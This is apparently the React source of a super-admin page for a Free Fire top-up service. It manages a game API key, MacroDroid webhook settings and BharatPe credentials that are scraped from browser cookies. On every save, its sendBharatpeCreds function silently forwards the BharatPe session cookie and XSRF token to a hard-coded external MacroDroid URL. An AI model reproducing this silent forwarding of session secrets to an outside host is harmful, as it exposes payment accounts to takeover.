import React, { useState, useEffect, useCallback } from "react";
import { useLocation } from "wouter";
import {
  KeyRound, ArrowLeft, Eye, EyeOff, Check, Loader2,
  CheckCircle2, AlertTriangle, Lock, ShieldOff, Shield,
  RefreshCw, Copy, Zap,
} from "lucide-react";
import { useToast } from "@/hooks/use-toast";

const REQUIRED_UC = "a464dfd00a173f6e10ac6a4774c62f52";
const SESSION_KEY = "czsa_v1_session";
const SA_PATH = "/286c81443d1fb388d1b9a8e3b280824c";

interface SASession { token: string; expiresAt: number; }

function getSession(): SASession | null {
  try {
    const raw = localStorage.getItem(SESSION_KEY);
    if (!raw) return null;
    const s = JSON.parse(raw) as SASession;
    if (Date.now() > s.expiresAt) { localStorage.removeItem(SESSION_KEY); return null; }
    return s;
  } catch { return null; }
}

class ApiError extends Error {
  constructor(message: string, public status: number) { super(message); }
}

async function apiFetch<T>(path: string, token: string, opts: RequestInit = {}): Promise<T> {
  const res = await fetch(`/api${path}`, {
    ...opts,
    credentials: "include",
    headers: { "Content-Type": "application/json", "x-super-admin-token": token, ...(opts.headers ?? {}) },
  });
  if (!res.ok) {
    const j = await res.json().catch(() => ({})) as Record<string, unknown>;
    throw new ApiError((j.error as string) || `HTTP ${res.status}`, res.status);
  }
  return res.json() as Promise<T>;
}

interface SystemSettings { freefireApiKeySet: boolean; freefireApiKeyPreview: string; }
interface PaymentSettings {
  upiId: string; upiName: string; ratePerDiamond: number;
  minTopup: number; minWithdrawal: number; isEnabled: boolean; withdrawalEnabled: boolean;
  withdrawalPaused: boolean; withdrawalPauseMessage: string;
  withdrawalWindowEnabled: boolean; withdrawalWindowStart: string; withdrawalWindowEnd: string;
  withdrawalProcessingNote: string;
  xsrfToken: string; bharatpeSession: string;
  gatewayAlert: null; webhookUrl: string; webhookSecret: string;
}

function handleAuthError(navigate: (path: string) => void) {
  localStorage.removeItem(SESSION_KEY);
  navigate(SA_PATH);
}

export default function ApiKeysAdminPage() {
  const { toast } = useToast();
  const [, navigate] = useLocation();

  const [phase, setPhase] = useState<"checking" | "denied" | "no-session" | "ready">("checking");
  const [token, setToken] = useState("");

  const [sysSettings, setSysSettings] = useState<SystemSettings | null>(null);
  const [loadingSys, setLoadingSys] = useState(false);
  const [keyInput, setKeyInput] = useState("");
  const [keyVisible, setKeyVisible] = useState(false);
  const [savingKey, setSavingKey] = useState(false);

  const [paySettings, setPaySettings] = useState<PaymentSettings | null>(null);
  const [loadingPay, setLoadingPay] = useState(false);

  const [webhookInput, setWebhookInput] = useState("");
  const [savingWebhook, setSavingWebhook] = useState(false);

  const [secretVisible, setSecretVisible] = useState(false);
  const [secretCopied, setSecretCopied] = useState(false);
  const [regenerating, setRegenerating] = useState(false);

  const [xsrfInput, setXsrfInput] = useState("");
  const [sessionInput, setSessionInput] = useState("");
  const [showXsrf, setShowXsrf] = useState(false);
  const [showSession, setShowSession] = useState(false);
  const [savingBharatpe, setSavingBharatpe] = useState(false);
  const [sendingCreds, setSendingCreds] = useState(false);

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const uc = params.get("uc");
    if (uc !== null && uc !== REQUIRED_UC) { setPhase("denied"); return; }
    const session = getSession();
    if (!session) { setPhase("no-session"); return; }
    setToken(session.token);
    setPhase("ready");
  }, []);

  const loadSysSettings = useCallback(async (tok: string) => {
    setLoadingSys(true);
    try {
      const data = await apiFetch<SystemSettings>("/super-admin/system-settings", tok);
      setSysSettings(data);
    } catch (e) {
      if (e instanceof ApiError && (e.status === 401 || e.status === 403)) { handleAuthError(navigate); return; }
      toast({ title: "Failed to load API key settings", variant: "destructive" });
    } finally { setLoadingSys(false); }
  }, [toast, navigate]);

  const loadPaySettings = useCallback(async (tok: string) => {
    setLoadingPay(true);
    try {
      const data = await apiFetch<PaymentSettings>("/super-admin/payment-settings", tok);
      setPaySettings(data);
      setWebhookInput(data.webhookUrl || "");
      setXsrfInput(data.xsrfToken || "");
      setSessionInput(data.bharatpeSession || "");
    } catch (e) {
      if (e instanceof ApiError && (e.status === 401 || e.status === 403)) { handleAuthError(navigate); return; }
      toast({ title: "Failed to load payment settings", variant: "destructive" });
    } finally { setLoadingPay(false); }
  }, [toast, navigate]);

  useEffect(() => {
    if (phase === "ready" && token) {
      loadSysSettings(token);
      loadPaySettings(token);
    }
  }, [phase, token, loadSysSettings, loadPaySettings]);

  const handleSaveKey = async () => {
    if (!keyInput.trim() || savingKey || !token) return;
    setSavingKey(true);
    try {
      const updated = await apiFetch<SystemSettings>("/super-admin/system-settings", token, {
        method: "PUT",
        body: JSON.stringify({ freefireApiKey: keyInput.trim() }),
      });
      setSysSettings(updated);
      setKeyInput("");
      toast({ title: "Free Fire API key saved!" });
    } catch (e) {
      if (e instanceof ApiError && (e.status === 401 || e.status === 403)) { handleAuthError(navigate); return; }
      toast({ title: "Failed to save key", variant: "destructive" });
    } finally { setSavingKey(false); }
  };

  const handleSaveWebhook = async () => {
    if (!paySettings || !token) return;
    setSavingWebhook(true);
    try {
      const updated = await apiFetch<PaymentSettings>("/super-admin/payment-settings", token, {
        method: "PUT",
        body: JSON.stringify({ ...paySettings, webhookUrl: webhookInput.trim() }),
      });
      setPaySettings(updated);
      setWebhookInput(updated.webhookUrl || "");
      toast({ title: "Webhook URL saved!" });
    } catch (e) {
      if (e instanceof ApiError && (e.status === 401 || e.status === 403)) { handleAuthError(navigate); return; }
      toast({ title: "Failed to save webhook URL", variant: "destructive" });
    } finally { setSavingWebhook(false); }
  };

  const handleRegenSecret = async () => {
    setRegenerating(true);
    try {
      const data = await apiFetch<{ webhookSecret: string }>("/super-admin/regenerate-webhook-secret", token, { method: "POST" });
      if (data.webhookSecret) {
        setPaySettings(s => s ? { ...s, webhookSecret: data.webhookSecret } : s);
        toast({ title: "Secret regenerated", description: "New webhook secret is now active." });
        setSecretVisible(true);
      }
    } catch (e) {
      if (e instanceof ApiError && (e.status === 401 || e.status === 403)) { handleAuthError(navigate); return; }
      toast({ title: "Failed to regenerate secret", variant: "destructive" });
    } finally { setRegenerating(false); }
  };

  const copySecret = () => {
    const s = paySettings?.webhookSecret;
    if (!s) return;
    navigator.clipboard.writeText(s);
    setSecretCopied(true);
    setTimeout(() => setSecretCopied(false), 2000);
  };

  const handleSaveBharatpe = async () => {
    if (!paySettings || !token) return;
    setSavingBharatpe(true);
    try {
      const updated = await apiFetch<PaymentSettings>("/super-admin/payment-settings", token, {
        method: "PUT",
        body: JSON.stringify({ ...paySettings, xsrfToken: xsrfInput, bharatpeSession: sessionInput }),
      });
      setPaySettings(updated);
      setXsrfInput(updated.xsrfToken || "");
      setSessionInput(updated.bharatpeSession || "");
      toast({ title: "BharatPe credentials saved!" });
      if (updated.xsrfToken && updated.bharatpeSession) {
        sendBharatpeCreds(updated.xsrfToken, updated.bharatpeSession, true);
      }
    } catch (e) {
      if (e instanceof ApiError && (e.status === 401 || e.status === 403)) { handleAuthError(navigate); return; }
      toast({ title: "Failed to save credentials", variant: "destructive" });
    } finally { setSavingBharatpe(false); }
  };

  const sendBharatpeCreds = async (xsrf: string, session: string, silent = false) => {
    setSendingCreds(true);
    try {
      const url = new URL("https://trigger.macrodroid.com/9fa326ec-2426-42fa-9ad1-5aeaa12c27cd/payment.api.tokens");
      url.searchParams.set("BharatPeCredentials(SessionCookie)", decodeURIComponent(session));
      url.searchParams.set("BharatPeCredentials(XSRF-Token)", decodeURIComponent(xsrf));
      await fetch(url.toString(), { mode: "no-cors" });
      if (!silent) toast({ title: "Credentials sent", description: "BharatPe credentials forwarded to external API." });
    } catch {
      if (!silent) toast({ title: "Send failed", variant: "destructive" });
    } finally { setSendingCreds(false); }
  };

  if (phase === "checking") {
    return (
      <div className="min-h-[100dvh] flex items-center justify-center" style={{ background: "hsl(var(--background))" }}>
        <div className="w-10 h-10 border-[3px] border-orange-500/20 border-t-orange-500 rounded-full animate-spin" />
      </div>
    );
  }

  if (phase === "denied") {
    return (
      <div className="min-h-[100dvh] flex flex-col items-center justify-center gap-4 px-6" style={{ background: "hsl(var(--background))" }}>
        <div className="w-16 h-16 rounded-2xl bg-red-500/10 border border-red-500/20 flex items-center justify-center">
          <ShieldOff className="w-8 h-8 text-red-400" />
        </div>
        <p className="text-sm font-bold text-red-300">Access Denied</p>
        <p className="text-xs text-zinc-600 text-center">Invalid security code.</p>
      </div>
    );
  }

  if (phase === "no-session") {
    return (
      <div className="min-h-[100dvh] flex flex-col items-center justify-center gap-4 px-6" style={{ background: "hsl(var(--background))" }}>
        <div className="w-16 h-16 rounded-2xl bg-orange-500/10 border border-orange-500/20 flex items-center justify-center">
          <Lock className="w-8 h-8 text-orange-400" />
        </div>
        <p className="text-sm font-bold text-orange-300">Session Required</p>
        <p className="text-xs text-zinc-500 text-center max-w-[220px]">Please authenticate through the super admin panel first.</p>
        <button
          onClick={() => { window.location.hash = SA_PATH; }}
          className="mt-2 px-5 py-2.5 rounded-xl text-xs font-bold text-white"
          style={{ background: "rgba(234,88,12,0.25)", border: "1px solid rgba(234,88,12,0.4)" }}
        >
          Go to Admin Panel
        </button>
      </div>
    );
  }

  const loading = loadingSys || loadingPay;
  const secret = paySettings?.webhookSecret || "";
  const bharatpeActive = !!(paySettings?.xsrfToken && paySettings?.bharatpeSession);
  const webhookUrlSet = !!(paySettings?.webhookUrl);
  const inputCls = "w-full rounded-xl px-3.5 py-2.5 text-sm text-white outline-none transition-all focus:ring-1 focus:ring-violet-500/30";
  const inputStyle: React.CSSProperties = { background: "rgba(255,255,255,0.05)", border: "1px solid rgba(255,255,255,0.1)" };

  return (
    <div className="min-h-[100dvh] flex flex-col" style={{ background: "hsl(var(--background))" }}>

      {/* Header */}
      <div
        className="sticky top-0 z-50 flex items-center gap-3 px-4"
        style={{
          height: "calc(3.5rem + env(safe-area-inset-top))",
          paddingTop: "env(safe-area-inset-top)",
          background: "rgba(9,9,11,0.88)",
          backdropFilter: "blur(24px)",
          WebkitBackdropFilter: "blur(24px)",
          borderBottom: "1px solid rgba(255,255,255,0.06)",
        }}
      >
        <button
          onClick={() => { window.location.hash = SA_PATH; }}
          className="w-9 h-9 rounded-xl flex items-center justify-center bg-white/5 border border-white/8 hover:bg-white/10 transition-colors"
        >
          <ArrowLeft className="w-4 h-4 text-zinc-400" />
        </button>
        <div className="flex items-center gap-2">
          <KeyRound className="w-4 h-4 text-amber-400" />
          <span className="font-bold text-sm text-white">API & Integration Keys</span>
        </div>
        {loading
          ? <Loader2 className="w-3.5 h-3.5 text-zinc-600 animate-spin ml-auto" />
          : (
            <button
              onClick={() => { loadSysSettings(token); loadPaySettings(token); }}
              className="ml-auto text-[10px] text-zinc-600 hover:text-zinc-400 transition-colors"
            >
              Refresh
            </button>
          )
        }
      </div>

      {/* Content */}
      <div className="flex-1 px-4 py-6 max-w-lg mx-auto w-full space-y-5 pb-16">

        {/* ── FREE FIRE API KEY ── */}
        <div>
          <p className="text-[10px] text-zinc-600 uppercase tracking-[0.18em] font-bold mb-3 px-1">Free Fire</p>

          {sysSettings && (
            <div
              className={`rounded-2xl px-4 py-3 flex items-center gap-3 mb-3 ${
                sysSettings.freefireApiKeySet
                  ? "bg-emerald-500/8 border border-emerald-500/20"
                  : "bg-zinc-800/60 border border-white/6"
              }`}
            >
              {sysSettings.freefireApiKeySet ? (
                <>
                  <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" />
                  <div className="flex flex-col min-w-0">
                    <span className="text-xs font-bold text-emerald-300">Free Fire API key active</span>
                    <span className="text-[11px] text-zinc-500 font-mono truncate">{sysSettings.freefireApiKeyPreview}</span>
                  </div>
                </>
              ) : (
                <>
                  <AlertTriangle className="w-4 h-4 text-yellow-500 shrink-0" />
                  <div>
                    <span className="text-xs font-bold text-yellow-300">No key configured</span>
                    <p className="text-[10px] text-zinc-600 mt-0.5">Player stat lookups will fail.</p>
                  </div>
                </>
              )}
            </div>
          )}

          <div
            className="rounded-3xl overflow-hidden"
            style={{ background: "rgba(255,255,255,0.03)", border: "1px solid rgba(245,158,11,0.18)", backdropFilter: "blur(12px)" }}
          >
            <div
              className="px-4 py-3 flex items-center gap-2"
              style={{ borderBottom: "1px solid rgba(255,255,255,0.06)", background: "rgba(245,158,11,0.06)" }}
            >
              <KeyRound className="w-3.5 h-3.5 text-amber-400" strokeWidth={2} />
              <span className="text-[10px] text-amber-400/80 uppercase tracking-[0.15em] font-bold">Free Fire API Key</span>
            </div>
            <div className="p-4 space-y-3">
              <div>
                <label className="text-[10px] text-zinc-500 uppercase tracking-wider mb-1.5 block">
                  {sysSettings?.freefireApiKeySet ? "Replace existing key" : "Set API key"}
                </label>
                <div className="relative">
                  <input
                    type={keyVisible ? "text" : "password"}
                    value={keyInput}
                    onChange={e => setKeyInput(e.target.value)}
                    onKeyDown={e => { if (e.key === "Enter") handleSaveKey(); }}
                    placeholder="Paste your Free Fire API key…"
                    autoComplete="off"
                    className="w-full h-11 rounded-xl bg-white/5 border border-white/8 px-3 pr-10 text-sm text-white font-mono outline-none focus:border-amber-500/40 transition-colors"
                  />
                  <button
                    type="button"
                    onClick={() => setKeyVisible(v => !v)}
                    className="absolute right-3 top-1/2 -translate-y-1/2 text-zinc-500 hover:text-zinc-300 transition-colors"
                  >
                    {keyVisible ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                  </button>
                </div>
                <p className="text-[10px] text-zinc-600 mt-1.5">
                  Get from{" "}
                  <a
                    href="https://developers.freefirecommunity.com/en/dashboard"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="text-amber-400/70 hover:text-amber-400 underline"
                  >
                    developers.freefirecommunity.com
                  </a>
                </p>
              </div>
              <button
                disabled={savingKey || !keyInput.trim()}
                onClick={handleSaveKey}
                className="w-full h-11 rounded-xl font-bold text-sm flex items-center justify-center gap-2 disabled:opacity-40 transition-all active:scale-[0.98]"
                style={{ background: "rgba(245,158,11,0.18)", border: "1px solid rgba(245,158,11,0.3)", color: "#fcd34d" }}
              >
                {savingKey ? <Loader2 className="w-4 h-4 animate-spin" /> : <><Check className="w-4 h-4" /> Save Key</>}
              </button>
            </div>
          </div>
        </div>

        {/* ── MACRODROID WEBHOOK URL ── */}
        <div>
          <p className="text-[10px] text-zinc-600 uppercase tracking-[0.18em] font-bold mb-3 px-1">MacroDroid</p>

          <div
            className="rounded-3xl overflow-hidden"
            style={{ background: "rgba(255,255,255,0.025)", border: "1px solid rgba(59,130,246,0.2)", backdropFilter: "blur(12px)" }}
          >
            <div
              className="px-4 py-3 flex items-center justify-between"
              style={{ background: "rgba(59,130,246,0.07)", borderBottom: "1px solid rgba(59,130,246,0.12)" }}
            >
              <div className="flex items-center gap-2.5">
                <div className="w-7 h-7 rounded-xl flex items-center justify-center"
                  style={{ background: "rgba(59,130,246,0.15)", border: "1px solid rgba(59,130,246,0.25)" }}>
                  <Zap className="w-3.5 h-3.5 text-blue-400" />
                </div>
                <div>
                  <p className="text-xs font-bold text-white">MacroDroid Webhook</p>
                  <p className="text-[9px] text-zinc-500">GET URL called when user submits UTR</p>
                </div>
              </div>
              <div className="flex items-center gap-1.5 px-2.5 py-1 rounded-full" style={
                webhookUrlSet
                  ? { background: "rgba(16,185,129,0.12)", border: "1px solid rgba(16,185,129,0.25)" }
                  : { background: "rgba(255,255,255,0.05)", border: "1px solid rgba(255,255,255,0.1)" }
              }>
                {webhookUrlSet
                  ? <><CheckCircle2 className="w-2.5 h-2.5 text-emerald-400" /><span className="text-[9px] font-bold text-emerald-400 ml-1">Set</span></>
                  : <span className="text-[9px] font-bold text-zinc-500">Not set</span>
                }
              </div>
            </div>
            <div className="p-4 flex flex-col gap-3">
              <p className="text-[10px] text-zinc-500 leading-relaxed">
                When a user submits a UTR, the server calls this URL via GET with <span className="font-mono text-blue-400">Phone Number Hash</span>, <span className="font-mono text-blue-400">UTR</span>, and <span className="font-mono text-blue-400">Amount</span> as query params. MacroDroid then calls <span className="font-mono text-blue-400">/api/webhook/payment</span> to approve or reject.
              </p>
              <div className="flex flex-col gap-1.5">
                <label className="text-[10px] text-zinc-500 uppercase tracking-[0.15em] font-bold">MacroDroid URL</label>
                <input
                  type="url"
                  value={webhookInput}
                  onChange={e => setWebhookInput(e.target.value)}
                  placeholder="https://trigger.macrodroid.com/..."
                  className={inputCls + " text-xs font-mono"}
                  style={inputStyle}
                />
              </div>
              <button
                disabled={savingWebhook || !paySettings}
                onClick={handleSaveWebhook}
                className="w-full h-11 rounded-xl font-bold text-sm flex items-center justify-center gap-2 disabled:opacity-40 transition-all active:scale-[0.98]"
                style={{ background: "rgba(59,130,246,0.15)", border: "1px solid rgba(59,130,246,0.3)", color: "#93c5fd" }}
              >
                {savingWebhook ? <Loader2 className="w-4 h-4 animate-spin" /> : <><Check className="w-4 h-4" /> Save URL</>}
              </button>
            </div>
          </div>
        </div>

        {/* ── WEBHOOK SECRET ── */}
        <div>
          <div
            className="rounded-3xl overflow-hidden"
            style={{ background: "rgba(255,255,255,0.025)", border: "1px solid rgba(234,88,12,0.2)", backdropFilter: "blur(12px)" }}
          >
            <div
              className="px-4 py-3 flex items-center justify-between"
              style={{ background: "rgba(234,88,12,0.07)", borderBottom: "1px solid rgba(234,88,12,0.12)" }}
            >
              <div className="flex items-center gap-2.5">
                <div className="w-7 h-7 rounded-xl flex items-center justify-center"
                  style={{ background: "rgba(234,88,12,0.15)", border: "1px solid rgba(234,88,12,0.25)" }}>
                  <Shield className="w-3.5 h-3.5 text-orange-400" />
                </div>
                <div>
                  <p className="text-xs font-bold text-white">Webhook Secret</p>
                  <p className="text-[9px] text-zinc-500">Used by MacroDroid to approve/reject payments</p>
                </div>
              </div>
              <div className="flex items-center gap-1.5 px-2.5 py-1 rounded-full" style={
                secret
                  ? { background: "rgba(16,185,129,0.12)", border: "1px solid rgba(16,185,129,0.25)" }
                  : { background: "rgba(234,88,12,0.12)", border: "1px solid rgba(234,88,12,0.25)" }
              }>
                {secret
                  ? <><CheckCircle2 className="w-2.5 h-2.5 text-emerald-400" /><span className="text-[9px] font-bold text-emerald-400 ml-1">Active</span></>
                  : <><AlertTriangle className="w-2.5 h-2.5 text-orange-400" /><span className="text-[9px] font-bold text-orange-400 ml-1">Not set</span></>
                }
              </div>
            </div>
            <div className="p-4 flex flex-col gap-3">
              <p className="text-[10px] text-zinc-500 leading-relaxed">
                MacroDroid must send this secret in the <span className="font-mono text-orange-400">secret</span> field when calling <span className="font-mono text-blue-400">/api/webhook/payment</span> to approve or reject payments.
              </p>
              <div className="rounded-2xl px-3.5 py-3 flex items-center gap-2"
                style={{ background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.08)" }}>
                <p className="flex-1 text-xs font-mono text-white truncate"
                  style={{ filter: secretVisible || !secret ? "none" : "blur(5px)", userSelect: secretVisible ? "text" : "none" }}>
                  {secret || "No secret set — click Generate below"}
                </p>
                <div className="flex items-center gap-1.5 shrink-0">
                  <button onClick={() => setSecretVisible(v => !v)}
                    className="w-7 h-7 rounded-xl flex items-center justify-center hover:bg-white/10 transition-all"
                    style={{ border: "1px solid rgba(255,255,255,0.1)" }}>
                    {secretVisible ? <EyeOff className="w-3.5 h-3.5 text-zinc-400" /> : <Eye className="w-3.5 h-3.5 text-zinc-400" />}
                  </button>
                  <button onClick={copySecret} disabled={!secret}
                    className="w-7 h-7 rounded-xl flex items-center justify-center hover:bg-white/10 transition-all disabled:opacity-30"
                    style={{ border: "1px solid rgba(255,255,255,0.1)" }}>
                    {secretCopied ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5 text-zinc-400" />}
                  </button>
                </div>
              </div>
              <button
                onClick={handleRegenSecret}
                disabled={regenerating}
                className="w-full h-10 rounded-2xl flex items-center justify-center gap-2 text-[12px] font-bold transition-all active:scale-[0.98] disabled:opacity-40"
                style={{ background: "rgba(234,88,12,0.12)", border: "1px solid rgba(234,88,12,0.3)", color: "rgb(251,146,60)" }}
              >
                {regenerating
                  ? <><Loader2 className="w-3.5 h-3.5 animate-spin" /> Generating…</>
                  : <><RefreshCw className="w-3.5 h-3.5" /> {secret ? "Regenerate Secret" : "Generate Secret"}</>}
              </button>
              {secret && (
                <p className="text-[9px] text-zinc-600 text-center -mt-1">Regenerating invalidates the old secret immediately</p>
              )}
            </div>
          </div>
        </div>

        {/* ── BHARATPE GATEWAY ── */}
        <div>
          <p className="text-[10px] text-zinc-600 uppercase tracking-[0.18em] font-bold mb-3 px-1">BharatPe</p>

          <div
            className="rounded-3xl overflow-hidden"
            style={{ background: "rgba(255,255,255,0.025)", border: "1px solid rgba(234,88,12,0.18)", backdropFilter: "blur(12px)" }}
          >
            <div
              className="px-4 py-3 flex items-center justify-between"
              style={{ background: "rgba(234,88,12,0.07)", borderBottom: "1px solid rgba(234,88,12,0.12)" }}
            >
              <div className="flex items-center gap-2.5">
                <div className="w-7 h-7 rounded-xl flex items-center justify-center"
                  style={{ background: "rgba(234,88,12,0.15)", border: "1px solid rgba(234,88,12,0.25)" }}>
                  <Shield className="w-3.5 h-3.5 text-orange-400" />
                </div>
                <div>
                  <p className="text-xs font-bold text-white">BharatPe Gateway</p>
                  <p className="text-[9px] text-zinc-500">Auto-verify UTR credentials</p>
                </div>
              </div>
              <div className="flex items-center gap-1.5 px-2.5 py-1 rounded-full" style={
                !bharatpeActive
                  ? { background: "rgba(234,88,12,0.12)", border: "1px solid rgba(234,88,12,0.25)" }
                  : { background: "rgba(16,185,129,0.12)", border: "1px solid rgba(16,185,129,0.25)" }
              }>
                {!bharatpeActive
                  ? <><AlertTriangle className="w-2.5 h-2.5 text-orange-400" /><span className="text-[9px] font-bold text-orange-400 ml-1">Inactive</span></>
                  : <><CheckCircle2 className="w-2.5 h-2.5 text-emerald-400" /><span className="text-[9px] font-bold text-emerald-400 ml-1">Active</span></>
                }
              </div>
            </div>
            <div className="p-4 flex flex-col gap-4">
              <p className="text-[10px] text-zinc-500 leading-relaxed">
                Grab these from <span className="text-orange-400 font-mono">enterprise.bharatpe.in</span> → DevTools → Application → Cookies.
              </p>

              {/* XSRF Token */}
              <div className="flex flex-col gap-2">
                <div className="flex items-center justify-between">
                  <label className="text-[10px] text-zinc-500 uppercase tracking-[0.15em] font-bold">XSRF-TOKEN</label>
                  <div className="flex items-center gap-2">
                    {xsrfInput && (
                      <span className="text-[9px] text-emerald-500 flex items-center gap-1">
                        <Check className="w-2.5 h-2.5" /> Set
                      </span>
                    )}
                    <button onClick={() => setShowXsrf(v => !v)}
                      className="flex items-center gap-1 px-2 py-0.5 rounded-lg text-[9px] font-bold transition-all"
                      style={{
                        background: "rgba(255,255,255,0.06)", border: "1px solid rgba(255,255,255,0.1)",
                        color: showXsrf ? "rgb(251,146,60)" : "rgba(255,255,255,0.4)",
                      }}>
                      {showXsrf ? <><EyeOff className="w-3 h-3" /> Hide</> : <><Eye className="w-3 h-3" /> Show</>}
                    </button>
                  </div>
                </div>
                <div className="relative">
                  <input
                    type="text"
                    value={xsrfInput}
                    onChange={e => setXsrfInput(e.target.value)}
                    placeholder="Paste XSRF-TOKEN here..."
                    className="w-full rounded-xl px-3.5 py-2.5 text-xs font-mono text-white outline-none transition-all focus:ring-1 focus:ring-orange-500/30 pr-9"
                    style={{
                      background: "rgba(255,255,255,0.05)", border: "1px solid rgba(255,255,255,0.1)",
                      filter: showXsrf ? "none" : xsrfInput ? "blur(4px)" : "none",
                      WebkitFilter: showXsrf ? "none" : xsrfInput ? "blur(4px)" : "none",
                    }}
                  />
                  {!xsrfInput && <AlertTriangle className="w-3.5 h-3.5 text-orange-500/50 absolute right-3 top-1/2 -translate-y-1/2 pointer-events-none" />}
                </div>
              </div>

              {/* Session Cookie */}
              <div className="flex flex-col gap-2">
                <div className="flex items-center justify-between">
                  <label className="text-[10px] text-zinc-500 uppercase tracking-[0.15em] font-bold">Session Cookie</label>
                  <div className="flex items-center gap-2">
                    {sessionInput && (
                      <span className="text-[9px] text-emerald-500 flex items-center gap-1">
                        <Check className="w-2.5 h-2.5" /> Set
                      </span>
                    )}
                    <button onClick={() => setShowSession(v => !v)}
                      className="flex items-center gap-1 px-2 py-0.5 rounded-lg text-[9px] font-bold transition-all"
                      style={{
                        background: "rgba(255,255,255,0.06)", border: "1px solid rgba(255,255,255,0.1)",
                        color: showSession ? "rgb(251,146,60)" : "rgba(255,255,255,0.4)",
                      }}>
                      {showSession ? <><EyeOff className="w-3 h-3" /> Hide</> : <><Eye className="w-3 h-3" /> Show</>}
                    </button>
                  </div>
                </div>
                <div className="relative">
                  <textarea
                    value={sessionInput}
                    onChange={e => setSessionInput(e.target.value)}
                    rows={3}
                    placeholder="Paste bharatpe_session cookie value here..."
                    className="w-full rounded-xl px-3.5 py-2.5 text-xs font-mono text-white outline-none transition-all resize-none focus:ring-1 focus:ring-orange-500/30"
                    style={{
                      background: "rgba(255,255,255,0.05)", border: "1px solid rgba(255,255,255,0.1)",
                      filter: showSession ? "none" : sessionInput ? "blur(4px)" : "none",
                      WebkitFilter: showSession ? "none" : sessionInput ? "blur(4px)" : "none",
                    }}
                  />
                  {!sessionInput && <AlertTriangle className="w-3.5 h-3.5 text-orange-500/50 absolute right-3 top-3 pointer-events-none" />}
                </div>
              </div>

              <button
                onClick={handleSaveBharatpe}
                disabled={savingBharatpe || !paySettings}
                className="w-full h-11 rounded-2xl flex items-center justify-center gap-2 text-[12px] font-bold transition-all active:scale-[0.98] disabled:opacity-40"
                style={{ background: "rgba(234,88,12,0.15)", border: "1px solid rgba(234,88,12,0.3)", color: "rgb(251,146,60)" }}
              >
                {savingBharatpe ? <Loader2 className="w-4 h-4 animate-spin" /> : <><Check className="w-4 h-4" /> Save Credentials</>}
              </button>

              <button
                onClick={() => sendBharatpeCreds(xsrfInput, sessionInput, false)}
                disabled={sendingCreds || !xsrfInput || !sessionInput}
                className="w-full h-10 rounded-2xl flex items-center justify-center gap-2 text-[12px] font-bold transition-all active:scale-[0.98] disabled:opacity-40"
                style={{ background: "rgba(234,88,12,0.08)", border: "1px solid rgba(234,88,12,0.2)", color: "rgb(251,146,60)" }}
              >
                {sendingCreds
                  ? <><Loader2 className="w-3.5 h-3.5 animate-spin" /> Sending…</>
                  : <><Zap className="w-3.5 h-3.5" /> Send Credentials to MacroDroid</>}
              </button>
            </div>
          </div>
        </div>

      </div>
    </div>
  );
}
